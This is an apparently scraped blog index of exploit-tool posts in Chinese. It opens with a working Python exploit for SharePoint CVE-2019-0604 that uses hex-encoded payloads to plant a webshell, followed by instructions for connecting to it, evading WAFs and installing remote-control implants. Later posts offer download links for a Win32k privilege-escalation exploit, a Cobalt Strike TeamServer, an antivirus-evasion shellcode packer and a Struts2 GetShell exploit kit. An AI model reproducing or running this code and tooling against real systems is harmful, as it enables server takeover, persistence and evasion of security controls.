\\x30\\x30\\x32\\x32\\x30\\x30\\x64\\x33\\x30\\x30\\x64\\x33\\x30\\x30\\x64\\x33\\x30\\x30\\x32\\x32\\x30\\x30\\x39\\x32\\x30\\x30\\x39\\x32\\x30\\x30\\x64\\x33\\x30\\x30\\x64\\x33\\x30\\x30\\x30\\x32\\x30\\x30\\x30\\x37\\x30\\x30\\x37\\x37\\x30\\x30\\x34\\x36\\x30\\x30\\x39\\x32\\x30\\x30\\x30\\x32\\x30\\x30\\x62\\x37\\x30\\x30\\x36\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x32\\x37\\x30\\x30\\x30\\x32\\x30\\x30\\x33\\x36\\x30\\x30\\x66\\x36\\x30\\x30\\x34\\x36\\x30\\x30\\x35\\x36\\x30\\x30\\x64\\x33\\x30\\x30\\x35\\x37\\x30\\x30\\x31\\x36\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x32\\x37\\x30' payload4='\\x74\\x6F\\x6D\\x3D\\x3D\\x3D\\x52\\x65\\x73\\x70\\x6F\\x6E\\x73\\x65\\x2E\\x57\\x72\\x69\\x74\\x65\\x28\\x22\\x55\\x41\\x73\\x68\\x65\\x6C\\x6C\\x22\\x29\\x3B' payload5='\\x23\\x64\\x61\\x74\\x65\\x3A\\x20\\x32\\x30\\x31\\x39\\x30\\x36\\x32\\x36\\x20\\x23\\x61\\x75\\x74\\x68\\x6F\\x72\\x3A\\x20\\x6B\\x38\\x67\\x65\\x67\\x65' values = {‘REQUESTDIGEST’:’0xF4545A48FA093FD290D386F2E317C72EF439C05EABDC8BDF0D81022DAEFE10FF6D4782A17836870BB0EBF673E71DCD6F7E631A1371319881902FDEF3032A16F4,18 Jun 2019 16:41:35 -0000’,‘EVENTTARGET’:’’,‘EVENTARGUMENT’:’’,‘spPickerHasReturnValue’:’’,‘spPickerReturnValueHolder’:’’,‘VIEWSTATE’:’/wEPDwULLTIwNTYyMzI3OTQPZBYCZg9kFgQCBQ9kFgICBQ9kFgJmD2QWAgIBD2QWAmYPFgIeBFRleHQFBlBpY2tlcmQCCQ9kFgICBw9kFgwCAw9kFgJmDxYEHgxFcnJvck1lc3NhZ2VlHgtIdG1sTWVzc2FnZQVpPHNwYW4gY2xhc3M9Im1zLWVycm9yIj5BbiBlcnJvciBvY2N1cnJlZC4gQWRtaW5pc3RyYXRvcnMsIHNlZSB0aGUgc2VydmVyIGxvZyBmb3IgbW9yZSBpbmZvcm1hdGlvbi48L3NwYW4+ZAIFD2QWAmYPZBYCZg9kFgJmD2QWAgIBD2QWAmYPDxYCHwBlFgIeCW9ua2V5ZG93bgW1AXZhciBlPWV2ZW50OyBpZighZSkgZT13aW5kb3cuZXZlbnQ7IGlmKCFicm93c2VyaXMuc2FmYXJpICYmIGUua2V5Q29kZT09MTMpIHsgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDdfcXVlcnlCdXR0b24nKS5jbGljaygpOyByZXR1cm4gZmFsc2U7IH1kAgcPZBYCZg8PFgIfAAVpPHNwYW4gY2xhc3M9Im1zLWVycm9yIj5BbiBlcnJvciBvY2N1cnJlZC4gQWRtaW5pc3RyYXRvcnMsIHNlZSB0aGUgc2VydmVyIGxvZyBmb3IgbW9yZSBpbmZvcm1hdGlvbi48L3NwYW4+ZGQCCQ9kFgJmDw8WAh8AZWRkAgsPZBYCZg8PFgIeEkNPTFVNTkRJU1BMQVlOQU1FUxYAZGQCDQ9kFgICAQ9kFgQCAQ8WAh4FdmFsdWUFBkFkZCAtPmQCAw9kFgJmDw8WCh4OQ1VTVE9NUFJPUEVSVFllHgVXaWR0aBsAAAAAAABZQAcAAAAeCUlTQ0hBTkdFRGgeBF8hU0ICgAIeDEVuYWJsZUJyb3dzZWgWGB4OZWRpdG9yT2xkVmFsdWVlHgpSZW1vdmVUZXh0BQZSZW1vdmUfBWUeDU5vTWF0Y2hlc1RleHQFEU5vIE1hdGNoaW5nIEl0ZW1zHgphbGxvd0VtcHR5BQExHg1Nb3JlSXRlbXNUZXh0BQ1Nb3JlIEl0ZW1zLi4uHhhwcmVmZXJDb250ZW50RWRpdGFibGVEaXYFBHRydWUeHXNob3dEYXRhVmFsaWRhdGlvbkVycm9yQm9yZGVyBQVmYWxzZR4LYWxsb3dUeXBlSW4FBWZhbHNlHgppblZhbGlkYXRlBQVmYWxzZR4bRUVBZnRlckNhbGxiYWNrQ2xpZW50U2NyaXB0ZR4eU2hvd0VudGl0eURpc3BsYXlUZXh0SW5UZXh0Qm94BQEwFgICBA8PFgYfBxsAAAAAAABZQAcAAAAeCENzc0NsYXNzBQ1tcy11c2VyZWRpdG9yHwkCggJkFgRmDw8WBB4NVmVydGljYWxBbGlnbgsqJ1N5c3RlbS5XZWIuVUkuV2ViQ29udHJvbHMuVmVydGljYWxBbGlnbgMfCQKAgAhkFgJmD2QWAmYPZBYCZg9kFgJmD2QWBGYPFigeCHRhYmluZGV4BQEwHgdvbmZvY3VzBbEBU3RvcmVPbGRWYWx1ZSgnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScpOyBzYXZlT2xkRW50aXRpZXMoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTsgU3lzLlVJLkRvbUVsZW1lbnQuYWRkQ3NzQ2xhc3ModGhpcywgJ21zLWlucHV0Qm94QWN0aXZlJyk7Hg5hcmlhLW11bHRpbGluZQUEdHJ1ZR4Gb25ibHVyBYEDaWYodHlwZW9mKEV4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKT09J2Z1bmN0aW9uJyl7IGlmKFNob3VsZENhbGxDdXN0b21DYWxsQmFjaygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsZXZlbnQpKXtpZighVmFsaWRhdGVQaWNrZXJDb250cm9sKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jykpe1Nob3dWYWxpZGF0aW9uRXJyb3IoKTtyZXR1cm4gZmFsc2U7fWVsc2Uge0V4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7fX19IFN5cy5VSS5Eb21FbGVtZW50LnJlbW92ZUNzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx4Hb25jbGljawVHb25DbGlja1J3KHRydWUsIHRydWUsZXZlbnQsJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseCG9uY2hhbmdlBT91cGRhdGVDb250cm9sVmFsdWUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseB29uUGFzdGUFOmRvcGFzdGUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnLGV2ZW50KTsfEAUEdHJ1ZR4MQXV0b1Bvc3RCYWNrBQEwHgRyb3dzBQExHgtvbkRyYWdTdGFydAUOY2FuRXZ0KGV2ZW50KTseB29ua2V5dXAFPXJldHVybiBvbktleVVwUncoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTseBm9uQ29weQU5ZG9jb3B5KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1JyxldmVudCk7HgV0aXRsZQUURXh0ZXJuYWwgSXRlbSBQaWNrZXIfAwVQcmV0dXJuIG9uS2V5RG93blJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1JywgMywgZmFsc2UsIGV2ZW50KTseCnNwZWxsY2hlY2sFBWZhbHNlHg9jb250ZW50RWRpdGFibGUFBHRydWUeDWFyaWEtaGFzcG9wdXAFBHRydWUeBXN0eWxlBTp3b3JkLXdyYXA6IGJyZWFrLXdvcmQ7b3ZlcmZsb3cteDogaGlkZGVuO292ZXJmbG93LXk6IGF1dG87HgRyb2xlBQd0ZXh0Ym94ZAIBDw8WCh4IVGFiSW5kZXgBAAAfBxsAAAAAAABZQAcAAAAeBFJvd3MCAR8faB8JAoACFhIfGQWxAVN0b3JlT2xkVmFsdWUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTsgc2F2ZU9sZEVudGl0aWVzKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7IFN5cy5VSS5Eb21FbGVtZW50LmFkZENzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8iBT1yZXR1cm4gb25LZXlVcFJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7HyQFFEV4dGVybmFsIEl0ZW0gUGlja2VyHx0FP3VwZGF0ZUNvbnRyb2xWYWx1ZSgnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScpOx8bBYEDaWYodHlwZW9mKEV4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKT09J2Z1bmN0aW9uJyl7IGlmKFNob3VsZENhbGxDdXN0b21DYWxsQmFjaygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsZXZlbnQpKXtpZighVmFsaWRhdGVQaWNrZXJDb250cm9sKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jykpe1Nob3dWYWxpZGF0aW9uRXJyb3IoKTtyZXR1cm4gZmFsc2U7fWVsc2Uge0V4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7fX19IFN5cy5VSS5Eb21FbGVtZW50LnJlbW92ZUNzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8oBSJkaXNwbGF5OiBub25lO3Bvc2l0aW9uOiBhYnNvbHV0ZTsgHwMFUHJldHVybiBvbktleURvd25SdygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsIDMsIGZhbHNlLCBldmVudCk7Hx8FATAeGnJlbmRlckFzQ29udGVudEVkaXRhYmxlRGl2BQR0cnVlZAICDw8WAh4HVmlzaWJsZWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAgU0Y3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNyRxdWVyeUJ1dHRvbgUoY3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNVdO0+ZP+kKR1gMQud0zVHpuy8sqq7e4YSOgfg1USdFj’,‘VIEWSTATEGENERATOR’:’A123E449’,ct1+paySection+’$ctl07$queryTextBox’:’’,paySpanData:payload1+’4700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500d500c200020035009700370047005600d600e2004400160047001600e20035005600270067009600360056003700c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3002600730073001600530036005300630013009300330043005600030083009300a300c300f300’+payload2+’5600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002000200c300d400560047008600f60046000500160027001600d60056004700560027003700e300d000a000020002000200020002000200c3001600e600970045009700070056000200870037009600a3004700970007005600d3002200870037004600a3003700470027009600e60076002200e3006200c6004700b300250056003700f600570027003600560044009600360047009600f600e600160027009700d000a0008700d600c600e6003700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600f20007002700560037005600e6004700160047009600f600e6002200d000a0008700d600c600e6003700a3008700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c6002200d000a0008700d600c600e6003700a30035009700370047005600d600d30022003600c6002700d200e6001600d600560037000700160036005600’+payload3+’0e200250056000700c6001600360056008200070077004600b2002200d300d300d3002200c200220022009200b300560067001600c60082003600f60046005600c20022005700e600370016006600560022009200b3000200d700b3005200e500620076004700b3000200620076004700b3000200220052003400f600d600d600f600e60005002700f600760027001600d60064009600c600560037005200c500d400960036002700f6003700f600660047000200350086001600270056004600c500750056002600020035005600270067005600270002005400870047005600e60037009600f600e6003700c50013005300c50045005400d4000500c400140045005400c500c40014009500f400550045003500c50057001600e2001600370007008700220002006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b300d000a000900090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b300d000a00090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700620076004700b300d000a0006200c6004700b300f200250056003700f600570027003600560044009600360047009600f600e600160027009700620076004700b300d000a000c300f2001600e60097004500970007005600e300d000a0000200020002000200c300f200d400560047008600f60046000500160027001600d60056004700560027003700e300d000a00002000200c300f20005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a000c300f2005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f60067009600460056002700e300’,ct1+paySection+ct2+’$OriginalEntities’:’&lt;Entities /&gt;’,ct1+paySection+ct2+’$HiddenEntityKey’:’’,ct1+paySection+ct2+’$HiddenEntityDisplayText’:’’,ct1+paySection+ct2+’$downlevelTextBox’:’&nbsp;’,‘CALLBACKID’:ct1+paySection+’$ctl07’,‘CALLBACKPARAM’:’;#;#11;#;#;#’,‘EVENTVALIDATION’:’/wEdAArGxMN0ZJ7K9w5zktdyYEhBD0ElpjQ1qya+g3gJn5tj2kGdpzwPwReE9qIrxAfsdm2iW+aWbiEcyxsYaScsTlQ450VsGNyXdI9EVzK0gDisZ5XfOLdqAfYHRFskSc14VkFc8gJL9PF80m6F3xAWwiF2sOBSyZzTvibJdZIQ6/yiluhmzA7nAUttaM/XaeAk14GgLvO2vw2Ax/oUZshBCs1rvRIjfjnjQxx1nrwDNJpAlG8icRe2xKLDvCGTmWjcu2A=’} data = urllib.urlencode(values)req = urllib2.Request(url+spver, data)response = urllib2.urlopen(req)the_page = response.read()print exp+’\\n’+payload5print the_page headers = { “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8”, “Accept-Language”: “en”, “Cache-Control”: “max-age=0”, “Connection”: “keep-alive”, “Cookie”: “PHPSESSID=m2hbrvp548cg6v4ssp0l35kcj7; _ga=GA1.2.2052701472.1532920469; _gid=GA1.2.1351314954.1532920469; __atuvc=3%7C31; __atuvs=5b5e9a0418f6420c001”, #”User-Agent”: “Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36”, “Upgrade-Insecure-Requests”: “1”, uapay: payload4, } data = {“CALLBACKID”: “”, “VIEWSTATE”: “”, ‘ctl00$’+paySection+’$’: “”, “CALLBACKID”: “All”, “CALLBACKPARAM”: “”} response = requests.get(shellurl, headers=headers, timeout=5)if response.content==’UAshell’: print ‘UAshell: ‘+shellurl &nbsp; 实战: python cve-2019-0604-exp.py&nbsp;http://k8gege.github.io 若成功返回WebShell地址 UAshell访问报错，大家不要慌，原本设计就是这样子 使用K8飞刀CMD连接，当然你可以通过CMD下载其它的WebShell过去管理 比如菜刀,因为飞刀UA系列的WebShell除了过WAF，均无文件管理功能 使用UA而不使用菜刀一句话，是因为菜刀一句话都是POST，容易被WAF拦截 当然你传过去后发现目标无WAF或无杀软，再传其它Webshell或植入远控都可以 &nbsp; 下载： &nbsp;https://github.com/k8gege/CVE-2019-0604 &nbsp;https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"GetShell","slug":"GetShell","permalink":"http://k8gege.org/tags/GetShell/"},{"name":"Code","slug":"Code","permalink":"http://k8gege.org/tags/Code/"}]},{"title":"CVE-2019-0803提权工具","slug":"CVE-2019-0803提权工具","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:22:24.858Z","comments":true,"path":"p/fa25cc9b.html","link":"","permalink":"http://k8gege.org/p/fa25cc9b.html","excerpt":"","text":"0x000 漏洞信息CVE-2019-0803 | Win32k 特权提升漏洞发布时间: 2019-04-09当 Win32k 组件无法正确处理内存中的对象时，Windows 中存在特权提升漏洞。成功利用此漏洞的攻击者可以在内核模式中运行任意代码。攻击者可随后安装程序；查看、更改或删除数据；或者创建拥有完全用户权限的新帐户。若要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行一个为利用此漏洞而经特殊设计的应用程序，从而控制受影响的系统。 0x001 影响版本 Microsoft Windows Server 2019 0 Microsoft Windows Server 2016 0 Microsoft Windows Server 2012 R2 0 Microsoft Windows Server 2012 0 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 1803 0 Microsoft Windows Server 1709 0 Microsoft Windows RT 8.1 Microsoft Windows 8.1 for x64-based Systems 0 Microsoft Windows 8.1 for 32-bit Systems 0 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 10 Version 1809 for x64-based Systems 0 Microsoft Windows 10 Version 1809 for ARM64-based Systems 0 Microsoft Windows 10 Version 1809 for 32-bit Systems 0 Microsoft Windows 10 Version 1803 for x64-based Systems 0 Microsoft Windows 10 Version 1803 for ARM64-based Systems 0 Microsoft Windows 10 Version 1803 for 32-bit Systems 0 Microsoft Windows 10 version 1709 for x64-based Systems 0 Microsoft Windows 10 Version 1709 for ARM64-based Systems 0 Microsoft Windows 10 version 1709 for 32-bit Systems 0 Microsoft Windows 10 version 1703 for x64-based Systems 0 Microsoft Windows 10 version 1703 for 32-bit Systems 0 Microsoft Windows 10 Version 1607 for x64-based Systems 0 Microsoft Windows 10 Version 1607 for 32-bit Systems 0 Microsoft Windows 10 for x64-based Systems 0 Microsoft Windows 10 for 32-bit Systems 0 &nbsp;0x002 EXP用法 Usage: CVE-2019-0803.exe cmd cmdline 如图：可能需执行3-4次左右才能提权成功,测试系统为Win7 X64,其它未测。 0x003 下载 https://github.com/k8gege/K8tools 0x004 补丁 补丁号有很多个，不同的系统补丁号不一样，有时新的补丁包含旧洞补丁 旧的补丁号会被替换掉，所以每次提权都应该先到官方查看下对应补丁号 不要老是查询有没旧的补丁号，然后再去提权，没有旧的补丁号不代表没补 https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0803 0x005 链接 https://www.exploit-db.com/exploits/46920(steal Security token) https://github.com/mwrlabs/CVE-2016-7255EDB Note: Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/46920.zip https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0803 &lt;a title=&quot;External url&quot; href=&quot;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&quot; target=&quot;_blank&quot;&gt;http://packetstormsecurity.com/files/153034/Microsoft-Windows-Win32k-Privilege-Escalation.html&lt;/a&gt;&lt;/p&gt;","categories":[{"name":"提权","slug":"Lpe","permalink":"http://k8gege.org/categories/Lpe/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"LPE","slug":"LPE","permalink":"http://k8gege.org/tags/LPE/"}]},{"title":"Cobalt Strike TeamServer For Windows","slug":"Cobalt Strike TeamServer For Windows","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:28:25.889Z","comments":true,"path":"p/22e5f4a8.html","link":"","permalink":"http://k8gege.org/p/22e5f4a8.html","excerpt":"","text":"Cobalt Strike 3.x TeamServer for Windows 0x001 环境CS 3.12 或 3.13 Kali或Win最好安装jdk1.8.5或之后版本设置环境变量,如path=C:\\Program Files\\Java\\jdk1.8.0_05\\bin0x002 启动中转启动TeamServer.exe(第一次运行Win7后系统需右键管理员)TeamServer.exe IP pass 20190306编译版无需kali下生成cobaltstrike.store文件 0x003 下载 TeamServer.exe https://github.com/k8gege/K8tools/raw/master/TeamServer.exe","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/categories/CS/"}],"tags":[{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/tags/CS/"}]},{"title":"CobaltStrike & Metasploit Shellcode一键免杀工具","slug":"CobaltStrike(MSF)一键免杀工具","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:27:27.015Z","comments":true,"path":"p/9cffe32c.html","link":"","permalink":"http://k8gege.org/p/9cffe32c.html","excerpt":"","text":"0x001 前言 CobaltStrike &amp; Metasploit&nbsp; Shellcode一键免杀工具 加载器通过AES加密ShellCode，动态编译生成EXE。 1个月前该工具生成的exe免杀所有杀软，现在未测应该还能过90%的杀软吧。 可选.net版本为系统安装对应版本，1.0仅支持.net EXE生成。 后续版本不一定公开，望大家见谅，有兴趣的自行反编译生成的exe就知道怎么弄了。 注意: 一定要使用无后门特征的CS,否则上线1分钟就被个别杀软查杀(因为CS默认每分钟发送流量包,里面包含后门特征信息) 声明: 程序仅免杀shellcode部分,CS加载的其它模块不免杀(比如运行mimikaz读取密码被个别杀软查杀) CS其它模块免杀，请自行修改CS客户端资源里对应的DLL，比如mimikaz_x86.dll、mimikaz_x64.dll &nbsp; 0x002 下载 https://github.com/k8gege/K8tools/raw/master/K8_SC_ENCODE(CobaltStrike &amp; Metasploit Shellcode免杀工具).rar","categories":[{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"},{"name":"免杀","slug":"bypassAV","permalink":"http://k8gege.org/categories/bypassAV/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/categories/Metasploit/"},{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/categories/CS/"},{"name":"ShellCode","slug":"ShellCode","permalink":"http://k8gege.org/categories/ShellCode/"}],"tags":[{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"Cobalt Strike","slug":"CS","permalink":"http://k8gege.org/tags/CS/"},{"name":"Metasploit","slug":"Metasploit","permalink":"http://k8gege.org/tags/Metasploit/"}]},{"title":"K8 Struts2 EXP 综合漏洞利用工具","slug":"K8 Struts2 EXP 综合漏洞利用工具","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T15:15:58.258Z","comments":true,"path":"p/ab3e87f7.html","link":"","permalink":"http://k8gege.org/p/ab3e87f7.html","excerpt":"","text":"工具:&nbsp;K8&nbsp;Struts2&nbsp;Exploit组织:&nbsp;K8搞基大队[K8team]作者:&nbsp;K8拉登哥哥博客:&nbsp;http://qqhack8.blog.163.com发布:&nbsp;2014/7/31&nbsp;10:24:56简介: K8 Struts2 综合漏洞利用工具 (Apache Struts Remote Code Execution Exploit)Struts2漏洞检测工具&nbsp;&nbsp; Struts2漏洞测试工具&nbsp; K8 struts2 exploit Test&nbsp; Struts2 GetShell支持漏洞 (S2-045 devMode S2-032&nbsp; s2-020&nbsp; s2-019&nbsp; s2-016&nbsp; s2-013&nbsp; s2-009 S2-005)&nbsp; 声明:工具仅供安全检测或网络攻防研究,非法用途后果自负.图片: &nbsp; 新增任意文件上传 &nbsp; &nbsp; 功能:&nbsp;===========================================================================================[+]新增任意文件上传小马 (解决S2奇葩环境菜刀无法上传文件 &amp; 乱码问题)[+]10 S2-045&nbsp; CVE-2017-5638&nbsp;&nbsp; 支持执行CMD命令[+]9 devMode CVE-xxxx-xxxx&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令[+]8 S2-037&nbsp; CVE-2016-4438&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令[+]7 S2-032&nbsp; CVE-2016-3081&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令[+]6 S2-020&nbsp; CVE-2014-0094&nbsp;&nbsp; 支持GetShell (此洞特殊,EXP集成在飞刀)[+]5 S2-019&nbsp; CVE-2013-4316&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令[+]4 S2-016&nbsp; CVE-2013-2251&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令[+]3 S2-013&nbsp; CVE-2013-1966&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令[+]2 S2-009&nbsp; CVE-2011-3923&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令[+]1 S2-005&nbsp; CVE-2010-1870&nbsp;&nbsp; 支持GetShell/获取物理路径/执行CMD命令/列文件目录===========================================================================================CVE-2016-4438&nbsp; 影响版本：Struts 2.3.20 - Struts 2.3.28.1&nbsp; 官方公告：http://struts.apache.org/docs/s2-037.htmlCVE-2016-3081&nbsp; 影响版本：Struts 2.3.18 &ndash; Struts 2.3.28&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-032.htmlCVE-2014-0094&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.16&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-020.htmlCVE-2013-4316&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.15.1&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-019.htmlCVE-2013-2251&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.15&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-016.htmlCVE-2013-1966&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.3.14&nbsp;&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-013.htmlCVE-2011-3923&nbsp; 影响版本：Struts 2.0.0 -&nbsp; Struts 2.3.1.1&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.3.x/docs/s2-009.htmlCVE-2010-1870&nbsp; 影响版本：Struts 2.0.0 &ndash; Struts 2.1.8.1&nbsp;&nbsp; 官方公告：http://struts.apache.org/release/2.2.x/docs/s2-005.html===========================================================================================下载地址:文件: K8_Struts2_EXP.exeSHA1:3DAF7AD4FB7440C33E66613E6075A0F02EA9DF18平台:&nbsp;XP/Vista/Win7/Win8/2000/2003/2008/2012猛击:http://pan.baidu.com/s/1cpcQeE[原创]Struts2奇葩环境任意文件上传工具(解决菜刀无法传文件或上传乱码等问题)https://www.cnblogs.com/k8gege/p/10261217.html","categories":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/categories/Exp/"},{"name":"工具","slug":"Tool","permalink":"http://k8gege.org/categories/Tool/"}],"tags":[{"name":"Exp","slug":"Exp","permalink":"http://k8gege.org/tags/Exp/"},{"name":"Tool","slug":"Tool","permalink":"http://k8gege.org/tags/Tool/"},{"name":"GetShell","slug":"GetShell","permalink":"http://k8gege.org/tags/GetShell/"},{"name":"Struts2","slug":"Struts2","permalink":"http://k8gege.org/tags/Struts2/"}]},{"title":"K8飞刀Final","slug":"K8飞刀Final","date":"2019-12-02T16:00:00.000Z","updated":"2020-01-10T16:01:28.991Z","comments":true,"path":"p/de1a82bb.html","link":"","permalink":"http://k8gege.org/p/de1a82bb.html","excerpt":"","text":"法律声明: 工具仅供安全研究或授权渗透，非法用途后果自负。工具: K8飞刀Final作者: K8哥哥博客: https://www.cnblogs.com/k8gege简介: 一款多功能网络安全渗透测试工具(Hacker Swiss Army Knife)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1.漏洞利用：&nbsp;&nbsp; 已集成20个主流WEB、CMS程序,累计115个EXP（如Drupal、Joomla、Wordpress、Vbulletin、Xampp、Zimbra、ThinkPHP、Magento、Discuz）&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2.后台扫描：&nbsp;&nbsp; 后台管理、登陆地址、木马地址、数据等&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 